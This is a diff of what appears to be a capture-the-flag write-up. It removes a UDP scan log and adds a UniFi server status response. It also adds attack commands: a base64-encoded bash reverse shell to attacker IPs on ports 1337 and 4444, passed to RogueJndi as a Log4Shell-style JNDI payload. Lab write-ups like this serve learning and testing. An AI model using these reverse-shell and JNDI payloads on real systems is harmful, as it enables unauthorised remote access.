@@ -5245,24 +5245,6 @@ PORT     STATE SERVICE     VERSION
 
 
 
-
-----------------------Starting UDP Scan------------------------
-                                                                                                                                                                  
-UDP needs to be run as root, running with sudo...
-[sudo] password for kali: 
-
-In progress: No Scan (0:00:00 elapsed - 0:00:00 remaining)   
-              In progress: No Scan (0:00:00 elapsed - 0:00:00 remaining)                                                                                            ] 0% done                 In progress: UDP Scan (0:00:03 elapsed - 0:01:25 remaining)                                                                                           ] 0% done                 In progress: UDP Scan (0:00:06 elapsed - 0:01:25 remaining)                                                                                           ] 3% done                 In progress: UDP Scan (0:00:09 elapsed - 0:01:48 remaining)                                                                                           ] 5% done                 In progress: UDP Scan (0:00:12 elapsed - 0:01:26 remaining)                                                                                           ] 6% done                  In progress: UDP Scan (0:00:18 elapsed - 0:00:49 remaining)                                                                                          ] 12% done                  In progress: UDP Scan (0:00:21 elapsed - 0:00:35 remaining)   ###########>                                                                           ] 25% done                  In progress: UDP Scan (0:00:24 elapsed - 0:00:23 remaining)   ######################>                                                                ] 36% done                  In progress: UDP Scan (0:00:27 elapsed - 0:00:14 remaining)   ####################################>                                                  ] 50% done                  In progress: UDP Scan (0:00:30 elapsed - 0:00:12 remaining)   ###################################################>                                   ] 65% done                  In progress: UDP Scan (0:00:33 elapsed - 0:00:11 remaining)   #########################################################>                             ] 71% done   
-             In progress: UDP Scan (0:00:36 elapsed - 0:00:11 remaining)   ############################################################>                          ] 74% done                  In progress: UDP Scan (0:00:39 elapsed - 0:00:10 remaining)   ##############################################################>                        ] 76% done                  In progress: UDP Scan (0:00:42 elapsed - 0:00:09 remaining)   #################################################################>                     ] 79% done                  In progress: UDP Scan (0:00:45 elapsed - 0:00:08 remaining)   ####################################################################>                  ] 82% done                  In progress: UDP Scan (0:00:48 elapsed - 0:00:06 remaining)   #######################################################################>               ] 85% done                  In progress: UDP Scan (0:00:51 elapsed - 0:00:05 remaining)   ##########################################################################>            ] 88% done                  In progress: UDP Scan (0:00:54 elapsed - 0:00:04 remaining)   ############################################################################>          ] 90% done                  In progress: UDP Scan (0:00:57 elapsed - 0:00:02 remaining)   ###############################################################################>       ] 93% done                  In progress: UDP Scan (0:01:00 elapsed - 0:00:01 remaining)   ##################################################################################>    ] 96% done                  In progress: UDP Scan (0:01:03 elapsed - 0:00:00 remaining)   ####################################################################################>  ] 98% done   
- 
-
-
-
-No UDP ports are open
-                                                                                                                                                                  
-
-
-
 ---------------------Starting Vulns Scan-----------------------
                                                                                                                                                                   
 Running CVE scan on all ports
@@ -5637,6 +5619,39 @@ Finished ffuf scan
 
 
 ```
+```
+	
+meta	
+rc	"ok"
+up	true
+server_version	"6.4.54"
+uuid	"8918a2b4-6f90-4f13-8233-e29085bd16d7"
+data	[]
+```
+![Untitled](https://user-images.githubusercontent.com/59018247/182657726-a9ad5114-7abd-4384-ab80-73498592d98b.png)
+
+
+```
+└─$ echo 'bash -c bash -i >&/dev/tcp/10.19.16.37/1337 0>&1' |                   
+base64
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTkuMTYuMzcvMTMzNyAwPiYxCg==
+```
+
+echo 'bash -c bash -i >&/dev/tcp/10.10.16.37/4444 0>&1' | base64
+
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMzcvNDQ0NCAwPiYxCg==} | {base64,-d}|{bash,-i}" --hostname "10.10.16.37"
+
+
+
+
+
+
+
+
+
+
+
+
 
 We can see here our scan revealed a number of outstanding issues. We have a webserver, FTP, and SSH services running.
 
